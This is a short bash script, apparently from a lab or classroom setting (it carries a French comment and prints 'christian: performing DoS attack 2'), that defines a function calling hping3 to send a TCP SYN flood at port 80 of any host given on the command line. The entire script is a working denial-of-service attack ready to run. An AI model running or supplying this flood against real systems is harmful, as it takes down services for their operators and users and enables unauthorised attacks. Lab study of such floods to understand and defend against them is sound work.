#!/bin/bash

# Ceci est un commentaire
echo "*** christian: performing DoS attack 2 ***"

# hping3 for the attacks
function attack() {
    sudo hping3 -S --flood -V -p 80 $1
}

attack $1